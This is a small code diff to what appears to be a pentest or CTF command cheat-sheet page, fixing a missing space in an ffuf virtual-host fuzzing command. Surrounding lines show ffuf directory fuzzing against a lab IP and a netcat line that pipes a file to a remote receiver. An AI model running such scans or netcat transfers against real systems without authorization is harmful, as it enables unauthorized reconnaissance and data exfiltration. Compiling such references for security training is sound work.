@@ -290,7 +290,7 @@ nc -nv RECEIVER_IP 4444 &lt; file_to_send</div><div class="cmd-desc">Simple file
         <div class="cmd-body"><div class="cmd-code">ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt \
   -e .php,.html,.txt -fc 404 -t 100 -o ffuf.json</div><div class="cmd-desc">Extensions + filter 404s + 100 threads + JSON output. Tune with <code>-fs</code> (filter size) and <code>-fw</code> (filter words) to remove false positives.</div></div>
       </div>
-      <div class="cmd-card" data-cmd="ffuf -u http://10.10.10.10-H 'Host: FUZZ.target.htb' -w subdomains.txt -fs 4242" data-desc="Virtual host fuzzing via Host header">
+      <div class="cmd-card" data-cmd="ffuf -u http://10.10.10.10 -H 'Host: FUZZ.target.htb' -w subdomains.txt -fs 4242" data-desc="Virtual host fuzzing via Host header">
         <div class="cmd-card-header"><span class="cmd-label">VHost Fuzzing</span><div class="cmd-actions"><button class="cmd-btn fav-btn" onclick="toggleFav(this)">★</button><button class="cmd-btn" onclick="copyCmd(this,'ffuf -u http://10.10.10.10 -H \"Host: FUZZ.target.htb\" -w subdomains.txt -fs 4242')">copy</button></div></div>
         <div class="cmd-body"><div class="cmd-code">ffuf -u http://10.10.10.10 -H 'Host: FUZZ.target.htb' \
   -w subdomains.txt -fs 4242</div><div class="cmd-desc">Fuzz the Host header for virtual hosting. Filter by size (<code>-fs</code>) — do a test request first to get the default response size.</div></div>
